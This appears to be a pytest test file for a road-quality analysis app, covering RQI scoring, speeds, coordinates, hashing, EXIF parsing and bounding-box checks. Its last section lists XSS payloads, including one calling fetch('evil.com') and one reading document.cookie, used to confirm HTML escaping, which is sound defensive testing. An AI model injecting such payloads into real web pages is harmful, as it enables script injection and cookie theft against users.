"""
tests/test_project.py
CalRoad IQ — Comprehensive unit tests

Run with:
    pytest tests/ -v

Rules:
- NO OpenRouter API calls
- NO GeoCLIP model downloads
- NO external network access
- All tests must be deterministic
"""

import sys, os, io, html, json, hashlib, contextlib, tempfile
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

import pytest
from PIL import Image
from unittest.mock import patch, MagicMock

# ── Import pure functions from Project.py ────────────────────────────────
from Project import (
    compute_rqi, compute_speeds, fmt_coord,
    get_exif_gps, img_hash, _empty,
    BASE_SPEED, LA_CENTER,
)


# ════════════════════════════════════════════════════════════════════════
# 1. RQI COMPUTATION
# ════════════════════════════════════════════════════════════════════════

class TestComputeRQI:
    def test_perfect_road(self):
        assert compute_rqi(0, 0, 0) == 100

    def test_clamp_to_zero(self):
        """Massive defect counts must yield RQI == 0, never negative."""
        assert compute_rqi(100, 100, 100) == 0

    def test_formula_nominal(self):
        # 100 - 4*3 - 5*1 - 3*2 = 100 - 12 - 5 - 6 = 77
        assert compute_rqi(3, 1, 2) == 77

    def test_boundary_good(self):
        # 100 - 3*10 = 70  (exactly Good threshold)
        assert compute_rqi(0, 0, 10) == 70

    def test_boundary_moderate(self):
        # 100 - 5*12 = 40 (exactly Moderate threshold)
        assert compute_rqi(0, 12, 0) == 40

    def test_boundary_poor(self):
        assert compute_rqi(0, 13, 0) == 35   # < 40

    def test_single_pothole(self):
        assert compute_rqi(1, 0, 0) == 96

    def test_single_water(self):
        assert compute_rqi(0, 1, 0) == 95

    def test_single_crack(self):
        assert compute_rqi(0, 0, 1) == 97

    def test_rqi_min_is_zero(self):
        assert compute_rqi(999, 999, 999) == 0

    def test_rqi_max_is_hundred(self):
        assert compute_rqi(0, 0, 0) == 100


# ════════════════════════════════════════════════════════════════════════
# 2. SPEED COMPUTATION
# ════════════════════════════════════════════════════════════════════════

class TestComputeSpeeds:
    def test_rqi_100(self):
        avg, safe = compute_speeds(100)
        assert avg == BASE_SPEED
        assert safe == round(BASE_SPEED * 0.9, 1)

    def test_rqi_0_no_zero_speed(self):
        """RQI=0 must never produce 0 mph (div-by-zero / display bug)."""
        avg, safe = compute_speeds(0)
        assert avg > 0.0
        assert safe > 0.0

    def test_safe_always_leq_avg(self):
        for rqi in range(0, 101, 5):
            avg, safe = compute_speeds(rqi)
            assert safe <= avg, f"safe ({safe}) > avg ({avg}) at rqi={rqi}"

    def test_speeds_non_negative(self):
        for rqi in [0, 25, 50, 75, 100]:
            avg, safe = compute_speeds(rqi)
            assert avg >= 0
            assert safe >= 0

    def test_rqi_50_reasonable(self):
        avg, safe = compute_speeds(50)
        assert 20 < avg < BASE_SPEED
        assert 15 < safe < avg


# ════════════════════════════════════════════════════════════════════════
# 3. COORDINATE FORMATTING
# ════════════════════════════════════════════════════════════════════════

class TestFmtCoord:
    def test_north_west(self):
        lat_s, lng_s = fmt_coord(34.052, -118.243)
        assert "N" in lat_s
        assert "W" in lng_s

    def test_south_east(self):
        lat_s, lng_s = fmt_coord(-33.87, 151.21)
        assert "S" in lat_s
        assert "E" in lng_s

    def test_equator_prime_meridian(self):
        lat_s, lng_s = fmt_coord(0.0, 0.0)
        assert "N" in lat_s  # 0 is non-negative
        assert "E" in lng_s

    def test_precision(self):
        lat_s, lng_s = fmt_coord(34.052, -118.243)
        assert "34.05200" in lat_s
        assert "118.24300" in lng_s

    def test_extreme_north(self):
        lat_s, _ = fmt_coord(90.0, 0.0)
        assert "N" in lat_s

    def test_extreme_south(self):
        lat_s, _ = fmt_coord(-90.0, 0.0)
        assert "S" in lat_s


# ════════════════════════════════════════════════════════════════════════
# 4. IMAGE HASHING
# ════════════════════════════════════════════════════════════════════════

class TestImgHash:
    def test_deterministic(self):
        img = Image.new("RGB", (200, 200), color=(10, 20, 30))
        assert img_hash(img) == img_hash(img)

    def test_different_images_differ(self):
        img1 = Image.new("RGB", (200, 200), color=(10, 20, 30))
        img2 = Image.new("RGB", (200, 200), color=(200, 100, 50))
        assert img_hash(img1) != img_hash(img2)

    def test_returns_string(self):
        img = Image.new("RGB", (50, 50))
        h = img_hash(img)
        assert isinstance(h, str)
        assert len(h) == 64  # SHA-256 hex digest length

    def test_no_md5(self):
        """Verify SHA-256 is used (64 chars), not MD5 (32 chars)."""
        img = Image.new("RGB", (50, 50))
        assert len(img_hash(img)) == 64


# ════════════════════════════════════════════════════════════════════════
# 5. EXIF GPS EXTRACTION
# ════════════════════════════════════════════════════════════════════════

class TestGetExifGps:
    def test_plain_image_no_exif(self):
        img = Image.new("RGB", (100, 100))
        lat, lng = get_exif_gps(img)
        assert lat is None
        assert lng is None

    def test_png_no_gps(self):
        buf = io.BytesIO()
        Image.new("RGB", (64, 64)).save(buf, format="PNG")
        buf.seek(0)
        img = Image.open(buf)
        lat, lng = get_exif_gps(img)
        assert lat is None
        assert lng is None

    def test_exception_handled_gracefully(self):
        """Corrupt image object must not raise."""
        class CorruptImg:
            def getexif(self): raise RuntimeError("corrupted")
        lat, lng = get_exif_gps(CorruptImg())
        assert lat is None
        assert lng is None


# ════════════════════════════════════════════════════════════════════════
# 6. _empty() DEFAULT DETECTION RESULT
# ════════════════════════════════════════════════════════════════════════

class TestEmpty:
    def test_zero_counts(self):
        e = _empty()
        assert e["pothole_count"] == 0
        assert e["water_count"] == 0
        assert e["crack_count"] == 0

    def test_empty_lists(self):
        e = _empty()
        assert e["potholes"] == []
        assert e["water"] == []
        assert e["cracks"] == []

    def test_all_required_keys(self):
        e = _empty()
        required = ["potholes", "water", "cracks",
                    "pothole_count", "water_count", "crack_count",
                    "overall_condition", "repair_urgency",
                    "surface_type", "visibility"]
        for key in required:
            assert key in e, f"Missing key: {key}"

    def test_returns_fresh_dict(self):
        """Two calls must return independent dicts (not same reference)."""
        e1 = _empty()
        e2 = _empty()
        e1["potholes"].append("x")
        assert e2["potholes"] == []


# ════════════════════════════════════════════════════════════════════════
# 7. COORDINATE VALIDATION (WGS-84 range)
# ════════════════════════════════════════════════════════════════════════

class TestCoordinateValidation:
    """Test that EXIF rejects out-of-range coordinates."""

    def test_valid_la_coords(self):
        lat, lng = LA_CENTER
        assert -90 <= lat <= 90
        assert -180 <= lng <= 180

    def test_invalid_lat_over_90(self):
        # Simulate values that should be rejected by EXIF parser
        # (tested via the EXIF sanity check path)
        assert not (-90 <= 91.0 <= 90)

    def test_invalid_lng_over_180(self):
        assert not (-180 <= 200.0 <= 180)

    def test_zero_zero_rejected(self):
        # (0, 0) is rejected in get_exif_gps — verify the rule
        lat, lng = 0.0, 0.0
        is_null_island = (lat == 0.0 and lng == 0.0)
        assert is_null_island  # confirms the check logic is correct


# ════════════════════════════════════════════════════════════════════════
# 8. AI RESPONSE VALIDATION
# ════════════════════════════════════════════════════════════════════════

class TestAIResponseValidation:
    """Test _valid_bbox logic inline (mirrors what run_detection uses)."""

    @staticmethod
    def _valid_bbox(d):
        try:
            x, y, w, h = float(d["x"]), float(d["y"]), float(d["w"]), float(d["h"])
            return 0.0 <= x <= 1.0 and 0.0 <= y <= 1.0 and w > 0 and h > 0
        except (KeyError, TypeError, ValueError):
            return False

    def test_valid_bbox(self):
        assert self._valid_bbox({"x": 0.1, "y": 0.1, "w": 0.3, "h": 0.2})

    def test_negative_x_rejected(self):
        assert not self._valid_bbox({"x": -0.1, "y": 0.1, "w": 0.3, "h": 0.2})

    def test_x_greater_than_1_rejected(self):
        assert not self._valid_bbox({"x": 1.5, "y": 0.1, "w": 0.3, "h": 0.2})

    def test_zero_width_rejected(self):
        assert not self._valid_bbox({"x": 0.1, "y": 0.1, "w": 0.0, "h": 0.2})

    def test_zero_height_rejected(self):
        assert not self._valid_bbox({"x": 0.1, "y": 0.1, "w": 0.3, "h": 0.0})

    def test_missing_key_rejected(self):
        assert not self._valid_bbox({"x": 0.1, "y": 0.1, "w": 0.3})  # no h

    def test_non_dict_rejected(self):
        assert not self._valid_bbox("invalid")

    def test_boundary_zero_coords(self):
        assert self._valid_bbox({"x": 0.0, "y": 0.0, "w": 0.5, "h": 0.5})

    def test_boundary_one_coords(self):
        assert self._valid_bbox({"x": 0.5, "y": 0.5, "w": 0.5, "h": 0.5})


# ════════════════════════════════════════════════════════════════════════
# 9. TEMP FILE CLEANUP
# ════════════════════════════════════════════════════════════════════════

class TestTempFileCleanup:
    def test_temp_file_created_and_deleted(self):
        """Verify tempfile lifecycle with contextlib.suppress pattern."""
        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as f:
            f.write(b"fake image data")
            path = f.name
        assert os.path.exists(path)
        with contextlib.suppress(OSError):
            os.unlink(path)
        assert not os.path.exists(path)

    def test_suppress_oserror_on_missing_file(self):
        """contextlib.suppress(OSError) must not raise on already-deleted file."""
        with contextlib.suppress(OSError):
            os.unlink("/tmp/calroad_nonexistent_12345.jpg")


# ════════════════════════════════════════════════════════════════════════
# 10. XSS SAFETY — HTML ESCAPING
# ════════════════════════════════════════════════════════════════════════

class TestMaliciousHTMLEscaping:
    MALICIOUS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        '"><script>alert(1)</script>',
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
        "a" * 10000,  # extremely long input
    ]

    def test_script_tag_escaped(self):
        for payload in self.MALICIOUS:
            escaped = html.escape(str(payload))
            # The tag delimiters must be escaped — attribute text may remain but is harmless
            assert "<script>" not in escaped  # angle brackets destroyed
            assert "<img" not in escaped      # img tag opener escaped
            assert "<svg" not in escaped      # svg tag opener escaped
            # javascript: URLs must not survive unescaped
            if "javascript:" in str(payload):
                assert "<script>" not in escaped

    def test_safe_text_passthrough(self):
        safe = "Los Angeles, California"
        assert html.escape(safe) == safe

    def test_long_input_handled(self):
        long_str = "A" * 100_000
        escaped = html.escape(long_str)
        assert len(escaped) == 100_000  # no entities needed for plain A

    def test_angle_brackets_escaped(self):
        assert html.escape("<b>test</b>") == "&lt;b&gt;test&lt;/b&gt;"

    def test_quotes_escaped(self):
        assert "&quot;" in html.escape('"quoted"')

    def test_ampersand_escaped(self):
        assert "&amp;" in html.escape("a & b")

    def test_city_xss(self):
        malicious_city = '<script>alert("XSS")</script>'
        safe_city = html.escape(malicious_city)
        assert "<script>" not in safe_city
        assert "&lt;script&gt;" in safe_city

    def test_reason_xss(self):
        malicious_reason = '<img src=x onerror="fetch(\'evil.com\')">'
        safe_reason = html.escape(malicious_reason)
        # html.escape encodes < > making the img tag inert; "onerror" text is harmless without the tag
        assert "<img" not in safe_reason   # tag opener must be encoded
        assert "&lt;img" in safe_reason    # encoded form must be present

    def test_urgency_xss(self):
        malicious_urgency = '"><script>steal()</script>'
        safe = html.escape(malicious_urgency)
        assert "<script>" not in safe

    def test_surface_xss(self):
        malicious_surface = "<script>document.cookie</script>"
        safe = html.escape(malicious_surface)
        assert "<script>" not in safe

